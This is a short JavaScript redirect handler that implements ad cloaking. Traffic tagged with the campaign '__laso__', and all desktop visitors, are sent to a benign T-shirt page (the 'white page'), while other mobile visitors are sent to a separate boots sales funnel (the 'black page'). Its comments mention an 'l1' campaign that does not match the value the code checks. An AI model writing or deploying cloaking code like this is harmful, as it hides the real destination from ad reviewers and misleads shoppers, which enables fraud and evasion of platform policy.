export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://toptees.pk/products/black-tee-shirt";
    const blackPageURL = "https://yorvardcntrlzs.myfunnelish.com/chelsea-boden-boots-1737635084899211-1737635118902954-1737635126522108";

    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__laso__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
